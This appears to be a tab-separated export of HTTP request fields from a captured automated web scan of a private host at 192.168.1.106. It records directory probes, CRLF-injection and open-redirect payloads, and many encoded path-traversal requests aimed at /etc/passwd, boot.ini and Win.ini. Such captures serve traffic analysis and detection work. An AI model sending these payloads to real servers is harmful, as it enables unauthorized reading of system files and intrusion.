http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																											192.168.1.106									1526						1	http://192.168.1.106/should_not_xist_qqqqqqqqqqqqq		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/should_not_xist_qqqqqqqqqqqqq
																											192.168.1.106									1528						1	http://192.168.1.106/web/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																											192.168.1.106															1	http://192.168.1.106/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/
																											192.168.1.106															1	http://192.168.1.106/crossdomain.xml%0aadmin.php%0aadmin.aspx%0a		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/crossdomain.xml%0aadmin.php%0aadmin.aspx%0a
																											192.168.1.106															1	http://192.168.1.106/admin%0auploads%0a/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/admin%0auploads%0a/
																											192.168.1.106									1538						1	http://192.168.1.106/admin%0auploads%0a/should_not_xist_tttttttttttttt		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/admin%0auploads%0a/should_not_xist_tttttttttttttt
																											192.168.1.106									1542						1	http://192.168.1.106/web/should_not_xist_vvvvvvvvvvvvvvv		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/should_not_xist_vvvvvvvvvvvvvvv
																											192.168.1.106									1529						1	http://192.168.1.106/web		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web
																											192.168.1.106									1566						1	http://192.168.1.106/eziepwlivt		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/eziepwlivt
																											192.168.1.106									1585						1	http://192.168.1.106/http%3a%252f%252fexample.org		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/http%3a%252f%252fexample.org
																											192.168.1.106									1565						1	http://192.168.1.106/web/crossdomain.xml%0aadmin.php%0aadmin.aspx%0a		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/crossdomain.xml%0aadmin.php%0aadmin.aspx%0a
																											192.168.1.106									1533						1	http://192.168.1.106/web/admin%0auploads%0a/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/admin%0auploads%0a/
																											192.168.1.106									1588						1	http://192.168.1.106/http%3a%252f%252f192.168.1.106.example.org		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/http%3a%252f%252f192.168.1.106.example.org
																											192.168.1.106									1591						1	http://192.168.1.106/https%3a%252f%252fexample.org		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/https%3a%252f%252fexample.org
																											192.168.1.106									1592						1	http://192.168.1.106/https%3a%252f%252f192.168.1.106.example.org		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/https%3a%252f%252f192.168.1.106.example.org
																											192.168.1.106									1593						1	http://192.168.1.106/%252f%252fexample.org		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%252f%252fexample.org
																											192.168.1.106									1594						1	http://192.168.1.106/%252f%252f192.168.1.106.example.org		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%252f%252f192.168.1.106.example.org
																											192.168.1.106									1595						1	http://192.168.1.106/example.org		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/example.org
																											192.168.1.106									1596						1	http://192.168.1.106/192.168.1.106.example.org		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/192.168.1.106.example.org
																											192.168.1.106									1597						1	http://192.168.1.106/URL%3d'http%3a%252f%252fexample.org'		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/URL%3d'http%3a%252f%252fexample.org'
																											192.168.1.106									1598						1	http://192.168.1.106/URL%3d'http%3a%252f%252f192.168.1.106.example.org'		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/URL%3d'http%3a%252f%252f192.168.1.106.example.org'
																											192.168.1.106									1599						1	http://192.168.1.106/5%3bURL%3d'http%3a%252f%252fexample.org'		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/5%3bURL%3d'http%3a%252f%252fexample.org'
																											192.168.1.106									1600						1	http://192.168.1.106/5%3bURL%3d'http%3a%252f%252f192.168.1.106.example.org'		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/5%3bURL%3d'http%3a%252f%252f192.168.1.106.example.org'
																											192.168.1.106									1590						1	http://192.168.1.106/web/admin%0auploads%0a/should_not_xist_iiiiiiiiiii		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/admin%0auploads%0a/should_not_xist_iiiiiiiiiii
																											192.168.1.106									1641						1	http://192.168.1.106/web/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																											192.168.1.106									1661						1	http://192.168.1.106/eziepwlivt/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/eziepwlivt/
																											192.168.1.106									1678						1	http://192.168.1.106/http%3a%252f%252fexample.org/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/http%3a%252f%252fexample.org/
																											192.168.1.106									1679						1	http://192.168.1.106/http%3a%252f%252f192.168.1.106.example.org/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/http%3a%252f%252f192.168.1.106.example.org/
																											192.168.1.106									1680						1	http://192.168.1.106/https%3a%252f%252fexample.org/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/https%3a%252f%252fexample.org/
																											192.168.1.106									1681						1	http://192.168.1.106/https%3a%252f%252f192.168.1.106.example.org/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/https%3a%252f%252f192.168.1.106.example.org/
																											192.168.1.106									1682						1	http://192.168.1.106/%252f%252fexample.org/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%252f%252fexample.org/
																											192.168.1.106									1683						1	http://192.168.1.106/%252f%252f192.168.1.106.example.org/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%252f%252f192.168.1.106.example.org/
																											192.168.1.106									1684						1	http://192.168.1.106/example.org/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/example.org/
																											192.168.1.106									1685						1	http://192.168.1.106/192.168.1.106.example.org/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/192.168.1.106.example.org/
																											192.168.1.106									1686						1	http://192.168.1.106/URL%3d'http%3a%252f%252fexample.org'/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/URL%3d'http%3a%252f%252fexample.org'/
																											192.168.1.106									1687						1	http://192.168.1.106/URL%3d'http%3a%252f%252f192.168.1.106.example.org'/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/URL%3d'http%3a%252f%252f192.168.1.106.example.org'/
																											192.168.1.106									1688						1	http://192.168.1.106/5%3bURL%3d'http%3a%252f%252fexample.org'/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/5%3bURL%3d'http%3a%252f%252fexample.org'/
																											192.168.1.106									1689						1	http://192.168.1.106/5%3bURL%3d'http%3a%252f%252f192.168.1.106.example.org'/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/5%3bURL%3d'http%3a%252f%252f192.168.1.106.example.org'/
																											192.168.1.106															1	http://192.168.1.106/web		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web
																											192.168.1.106															1	http://192.168.1.106/web		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web
																											192.168.1.106									1699						1	http://192.168.1.106/should_not_xist_hhhhhhhhhhh		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/should_not_xist_hhhhhhhhhhh
																											192.168.1.106									1701						1	http://192.168.1.106/web/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																											192.168.1.106															1	http://192.168.1.106/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/
																											192.168.1.106															1	http://192.168.1.106/crossdomain.xml%0aadmin.php%0aadmin.aspx%0a		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/crossdomain.xml%0aadmin.php%0aadmin.aspx%0a
																											192.168.1.106															1	http://192.168.1.106/admin%0auploads%0a/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/admin%0auploads%0a/
																											192.168.1.106									1711						1	http://192.168.1.106/admin%0auploads%0a/should_not_xist_yyyyyyyyyyyyyyy		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/admin%0auploads%0a/should_not_xist_yyyyyyyyyyyyyyy
																											192.168.1.106									1702						1	http://192.168.1.106/web/should_not_xist_tttttttttttttt		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/should_not_xist_tttttttttttttt
																											192.168.1.106									1735						1	http://192.168.1.106/web/crossdomain.xml%0aadmin.php%0aadmin.aspx%0a		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/crossdomain.xml%0aadmin.php%0aadmin.aspx%0a
																											192.168.1.106									1717						1	http://192.168.1.106/web/admin%0auploads%0a/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/admin%0auploads%0a/
																											192.168.1.106									1708						1	http://192.168.1.106/web		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web
																											192.168.1.106									1710						1	http://192.168.1.106/web/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																											192.168.1.106									1756						1	http://192.168.1.106/aaa		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/aaa
																											192.168.1.106									1758						1	http://192.168.1.106/%252f		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%252f
																											192.168.1.106									1759						1	http://192.168.1.106/%5c		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%5c
																											192.168.1.106									1760						1	http://192.168.1.106/file%3a%252faaa		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/file%3a%252faaa
																											192.168.1.106									1762						1	http://192.168.1.106/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%00.txt		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%00.txt
																											192.168.1.106									1764						1	http://192.168.1.106/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%00.html		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%00.html
																											192.168.1.106									1765						1	http://192.168.1.106/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%00.jpg		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%00.jpg
																											192.168.1.106									1766						1	http://192.168.1.106/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%00		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%00
																											192.168.1.106									1767						1	http://192.168.1.106/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
																											192.168.1.106									1769						1	http://192.168.1.106/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini%00.txt		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini%00.txt
																											192.168.1.106									1771						1	http://192.168.1.106/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini%00.html		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini%00.html
																											192.168.1.106									1772						1	http://192.168.1.106/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini%00.jpg		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini%00.jpg
																											192.168.1.106									1773						1	http://192.168.1.106/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini%00		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini%00
																											192.168.1.106									1774						1	http://192.168.1.106/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini
																											192.168.1.106									1791						1	http://192.168.1.106/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cWindows%5cWin.ini%00.txt		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cWindows%5cWin.ini%00.txt
																											192.168.1.106									1755						1	http://192.168.1.106/web/admin%0auploads%0a/should_not_xist_kkkkkkkkkkkk		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/admin%0auploads%0a/should_not_xist_kkkkkkkkkkkk
																											192.168.1.106									1815						1	http://192.168.1.106/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cWindows%5cWin.ini%00.html		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cWindows%5cWin.ini%00.html
																											192.168.1.106									1819						1	http://192.168.1.106/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cWindows%5cWin.ini%00.jpg		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cWindows%5cWin.ini%00.jpg
																											192.168.1.106									1757						1	http://192.168.1.106/aaa/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/aaa/
																											192.168.1.106									1838						1	http://192.168.1.106/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cWindows%5cWin.ini%00		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cWindows%5cWin.ini%00
																											192.168.1.106									1839						1	http://192.168.1.106/%252f/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%252f/
																											192.168.1.106									1841						1	http://192.168.1.106/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cWindows%5cWin.ini		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cWindows%5cWin.ini
																											192.168.1.106									1843						1	http://192.168.1.106/%5c/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%5c/
																											192.168.1.106									1847						1	http://192.168.1.106/file%3a%252faaa/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/file%3a%252faaa/
																											192.168.1.106									1868						1	http://192.168.1.106/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%00.txt/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%00.txt/
																											192.168.1.106									1871						1	http://192.168.1.106/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%00.html/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%00.html/
																											192.168.1.106									1872						1	http://192.168.1.106/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%00.jpg/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%00.jpg/
																											192.168.1.106									1873						1	http://192.168.1.106/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%00/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%00/
																											192.168.1.106									1874						1	http://192.168.1.106/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd/
																											192.168.1.106									1875						1	http://192.168.1.106/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini%00.txt/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini%00.txt/
																											192.168.1.106									1876						1	http://192.168.1.106/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini%00.html/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini%00.html/
																											192.168.1.106									1877						1	http://192.168.1.106/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini%00.jpg/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini%00.jpg/
																											192.168.1.106									1878						1	http://192.168.1.106/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini%00/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini%00/
																											192.168.1.106									1879						1	http://192.168.1.106/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini/
																											192.168.1.106									1880						1	http://192.168.1.106/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cWindows%5cWin.ini%00.txt/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cWindows%5cWin.ini%00.txt/
																											192.168.1.106									1881						1	http://192.168.1.106/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cWindows%5cWin.ini%00.html/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cWindows%5cWin.ini%00.html/
																											192.168.1.106									1882						1	http://192.168.1.106/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cWindows%5cWin.ini%00.jpg/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cWindows%5cWin.ini%00.jpg/
																											192.168.1.106									1883						1	http://192.168.1.106/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cWindows%5cWin.ini%00/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cWindows%5cWin.ini%00/
